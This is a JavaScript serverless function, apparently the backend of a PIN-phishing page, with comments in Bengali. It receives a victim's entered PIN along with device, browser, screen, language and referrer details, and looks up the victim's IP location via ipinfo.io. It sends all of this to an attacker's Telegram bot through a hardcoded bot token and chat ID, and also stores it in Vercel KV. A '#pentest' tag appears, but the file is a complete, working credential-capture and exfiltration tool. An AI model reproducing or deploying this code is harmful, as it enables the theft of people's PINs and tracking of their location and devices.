// api/capture.js
export const config = { runtime: 'edge' };

export default async function handler(req) {
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Content-Type': 'application/json'
    };
    
    if (req.method === 'OPTIONS') {
        return new Response(null, { status: 204, headers });
    }
    
    if (req.method !== 'POST') {
        return new Response(JSON.stringify({ error: 'Method not allowed' }), { 
            status: 405, headers 
        });
    }
    
    try {
        const data = await req.json();
        const clientIP = req.headers.get('x-forwarded-for') || 
                         req.headers.get('x-real-ip') || 
                         'Unknown';
        
        // === টেলিগ্রাম কনফিগারেশন ===
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8878710285:AAFBkHc2FFV_5EjA1FJ1rbgsrj-Z6TaxZC0';
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '6851275704';
        
        // সময়
        const time = new Date().toLocaleString('bn-BD', { 
            timeZone: data.timezone || 'Asia/Dhaka',
            dateStyle: 'full',
            timeStyle: 'medium'
        });
        
        // ডিভাইস ডিটেক্ট
        const ua = data.ua || 'Unknown';
        let device = '📱 Unknown';
        let deviceEmoji = '📱';
        if (ua.includes('Android')) { device = '📱 Android'; deviceEmoji = '🤖'; }
        else if (ua.includes('iPhone') || ua.includes('iPad')) { device = '🍎 iOS'; deviceEmoji = '🍎'; }
        else if (ua.includes('Windows')) { device = '💻 Windows'; deviceEmoji = '🪟'; }
        else if (ua.includes('Mac')) { device = '💻 macOS'; deviceEmoji = '💻'; }
        else if (ua.includes('Linux')) { device = '🐧 Linux'; deviceEmoji = '🐧'; }
        
        // ব্রাউজার
        let browser = 'Unknown';
        if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
        else if (ua.includes('Firefox')) browser = 'Firefox';
        else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
        else if (ua.includes('Edge')) browser = 'Edge';
        else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
        else if (ua.includes('FBAN') || ua.includes('FBAV')) browser = 'Facebook';
        else if (ua.includes('WhatsApp')) browser = 'WhatsApp';
        else if (ua.includes('Telegram')) browser = 'Telegram';
        else if (ua.includes('Messenger')) browser = 'Messenger Lite';
        else if (ua.includes('Instagram')) browser = 'Instagram';
        
        // IP লোকেশন
        let location = 'Unknown';
        try {
            const locResp = await fetch(`https://ipinfo.io/${clientIP}/json`);
            if (locResp.ok) {
                const locData = await locResp.json();
                location = [
                    locData.city || '',
                    locData.region || '',
                    locData.country || ''
                ].filter(Boolean).join(', ') || 'Unknown';
            }
        } catch(e) {}
        
        // PIN সঠিক না ভুল?
        const isCorrect = data.pin === '7380';
        const pinStatus = isCorrect ? '✅ **সঠিক PIN! (7380)**' : '❌ **ভুল PIN**';
        
        // === টেলিগ্রাম মেসেজ ===
        const message = `
🔴 <b>PIN CAPTURED!</b>
━━━━━━━━━━━━━━━
${pinStatus}
<b>PIN:</b> <code>${escapeHtml(data.pin)}</code>

━━━━━━━━━━━━━━━
${deviceEmoji} <b>Device:</b> ${device}
🌐 <b>Browser:</b> ${browser}
📱 <b>Platform:</b> ${data.platform || 'N/A'}
🖥️ <b>Screen:</b> ${data.screen || 'N/A'}
🌍 <b>Language:</b> ${data.language || 'N/A'}
⏰ <b>Timezone:</b> ${data.timezone || 'N/A'}
📌 <b>IP:</b> <code>${clientIP}</code>
📍 <b>Location:</b> ${location}
🔗 <b>Referrer:</b> ${data.referrer || 'Direct'}
🕐 <b>Time:</b> ${time}

📄 <b>UA:</b> <code>${escapeHtml(ua.substring(0, 100))}</code>
━━━━━━━━━━━━━━━
#pentest #pin #${device.includes('Android') ? 'android' : 'mobile'}
        `.trim();
        
        // টেলিগ্রামে পাঠান
        const tgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const tgResp = await fetch(tgUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });
        
        const tgResult = await tgResp.json();
        
        // Vercel KV
        let kvStored = false;
        try {
            const { kv } = await import('@vercel/kv');
            const key = `capture:${Date.now()}`;
            await kv.set(key, {
                pin: data.pin,
                isCorrect: isCorrect,
                ip: clientIP,
                device: device,
                browser: browser,
                screen: data.screen,
                language: data.language,
                timezone: data.timezone,
                location: location,
                referrer: data.referrer,
                userAgent: data.ua,
                timestamp: data.timestamp || new Date().toISOString()
            });
            await kv.expire(key, 604800);
            kvStored = true;
        } catch(kvError) {}
        
        return new Response(JSON.stringify({ 
            status: 'ok',
            correct: isCorrect,
            telegram: tgResult.ok,
            kv: kvStored
        }), { status: 200, headers });
        
    } catch(err) {
        return new Response(JSON.stringify({ 
            status: 'error', 
            message: err.message 
        }), { status: 500, headers });
    }
}

function escapeHtml(text) {
    if (!text) return '';
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}
